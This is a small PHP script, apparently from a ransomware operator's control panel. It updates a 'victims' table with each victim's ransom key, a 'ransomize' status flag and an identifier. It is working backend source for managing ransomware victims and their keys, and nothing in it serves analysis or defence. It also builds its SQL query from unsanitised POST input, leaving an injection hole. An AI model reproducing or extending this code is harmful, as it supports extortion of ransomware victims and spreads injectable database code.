<?php

require "conf.php";

if (isset($_POST['edit']))
{
	$id = intval($_POST['ransom_id']);
	$identifier = $_POST['identifier'];
	$key = $_POST['key'];
	$status = intval($_POST['status']);

	echo $id . $identifier . $key . $status;

	$sql = "UPDATE victims SET 
			ran_key = '$key',
			ransomize = $status,
			custom_identifier = '$identifier'
	 		WHERE ransomware_ID = $id";
	
	$res = $conn -> query($sql);
	if ($res)
	{
		echo "<script>
		alert('Record Updated!!!');
		window.location = 'index.php';
		</script>";	
		// echo "";
	}

	$conn -> close();

}
else
{
	header('location: index.php');
}

?>